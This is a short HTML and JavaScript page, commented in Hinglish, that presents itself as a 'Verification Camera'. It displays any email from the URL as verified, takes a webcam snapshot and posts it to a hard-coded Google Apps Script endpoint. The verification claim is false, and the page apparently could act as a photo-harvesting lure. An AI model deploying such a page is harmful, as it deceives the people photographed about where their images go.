<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Email Secure Camera</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .container { text-align: center; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        video { width: 100%; border-radius: 8px; margin-top: 10px; background: #000; transform: scaleX(-1); }
        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: bold; }
        button:hover { background-color: #0056b3; }
        #status { margin-top: 15px; font-weight: bold; color: #333; }
        .user-info { font-size: 14px; color: #555; background: #e9ecef; padding: 8px; border-radius: 6px; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Verification Camera</h2>
    <div class="user-info" id="emailDisplay">Checking User...</div>
    
    <video id="video" autoplay playsinline></video>
    <button id="captureBtn">Verify & Submit</button>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="status">Camera loading...</div>
</div>

<script>
    // 🚨 APNA GOOGLE APP SCRIPT URL YAHAN DAALEIN (Who has access: Anyone hona chahiye)
    const webAppUrl = "https://script.google.com/macros/s/AKfycbzKTqJWHuVEGCB07bArH7ak7yOHPN--JBPtFYdfktJqc4dviVHaXZJJsCJNYxbpLaG9Tg/exec";

    const video = document.getElementById('video');
    const captureBtn = document.getElementById('captureBtn');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const emailDisplay = document.getElementById('emailDisplay');

    // 🔥 SMART TRICK: URL se automatic email ID nikalna
    const urlParams = new URLSearchParams(window.location.search);
    let userEmail = urlParams.get('email');

    if (userEmail) {
        emailDisplay.innerText = "Verified User: " + userEmail;
    } else {
        userEmail = "Anonymous_User";
        emailDisplay.innerText = "User Profile: Not Logged In";
    }

    // Camera Start (GitHub par 100% allow karega)
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(stream => { video.srcObject = stream; statusDiv.innerText = "Camera Active"; })
        .catch(err => { statusDiv.innerText = "❌ Camera Permission Denied!"; });

    captureBtn.addEventListener('click', () => {
        statusDiv.innerText = "🔄 Capturing image...";
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Mirror effect fix
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/jpeg');
        statusDiv.innerText = "📤 Saving to Google Sheet...";

        // Data bhejba
        fetch(webAppUrl, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image: imageData, email: userEmail })
        })
        .then(() => {
            statusDiv.innerText = "✅ Saved Successfully!";
            alert("Done! Aapki verification photo save ho gayi hai.");
        })
        .catch(err => {
            statusDiv.innerText = "❌ Network Error! Link re-check karein.";
        });
    });
</script>

</body>
</html>
